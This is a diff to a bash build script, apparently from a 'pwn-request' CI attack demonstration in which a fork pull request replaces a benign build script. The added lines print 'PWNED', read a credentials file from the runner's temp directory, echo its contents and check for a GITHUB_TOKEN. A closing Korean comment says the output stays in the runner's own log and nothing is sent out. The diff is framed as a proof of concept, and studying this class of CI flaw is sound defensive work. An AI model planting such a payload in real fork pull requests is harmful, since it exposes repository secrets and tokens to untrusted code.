@@ -1,5 +1,9 @@
 #!/usr/bin/env bash
-# Baseline (benign) build script in the BASE repo. A normal PR looks like this.
-# In the pwn-request, a fork PR REPLACES this file (see ATTACKER_FORK_build.sh).
 set -euo pipefail
-echo "building the project... (benign baseline)"
+echo "=================================================="
+echo "PWNED: untrusted fork code executed on the runner"
+echo "=================================================="
+CREDS="${RUNNER_TEMP:-/tmp}/creds.txt"
+[ -f "$CREDS" ] && echo "secret is readable by fork code -> $(cat "$CREDS")"
+echo "GITHUB_TOKEN present in env: $([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
+(외부 유출 없음 — 본인 로그에만 출력)
